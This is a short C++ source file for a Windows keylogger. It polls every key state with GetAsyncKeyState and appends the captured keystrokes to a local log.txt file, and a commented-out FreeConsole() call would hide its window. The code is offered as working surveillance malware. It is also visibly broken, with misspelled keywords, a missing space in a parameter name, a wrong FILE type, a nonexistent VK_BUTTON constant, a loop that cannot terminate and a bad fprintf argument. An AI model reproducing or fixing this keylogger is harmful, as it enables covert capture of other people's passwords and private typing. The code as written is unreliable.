#include<iostream>
#include<Windows.h>


usning namespace std;


int Save(int_key, char *file);
int main(){

	/*FreeConsole();*/
	
	char i;
	while(true){
		
		/*sleep(10);*/
		
		for (i=8;i<255;i++){
			if(GetAsyncKeyState(i) == -32767)
			{
				Save(i, "log.txt");
			}
		}
	}
	return 0;
}

int Save (int_key, char *file){
		cout<<_key<<endl;

		/*sleep(10);*/

		File *OUTPUT_FILE;

		OUTPUT_FILE = fopen(file, "a+");
		if(_key == VK_SHIFT)
			fprintf(OUTPUT_FILE,"%s","[SHIFT]");
		
		else if (_key == VK_BACK)
			fprintf(OUTPUT_FILE,"%s","[BACK]");
		
		else if (_key == VK_BUTTON)
			fprintf(OUTPUT_FILE,"%s","[BUTTON]");
		
		else if (_key == VK_RETURN)
			fprintf(OUTPUT_FILE,"%s","[RETURN]");
		
		else if (_key == VK_ESCAPE)
			fprintf(OUTPUT_FILE,"%s","[ESCAPE]");

		else
			fprintf(OUTPUT_FILE, "%s", &_key);
			fclose(OUTPUT_FILE);
			return 0;



}
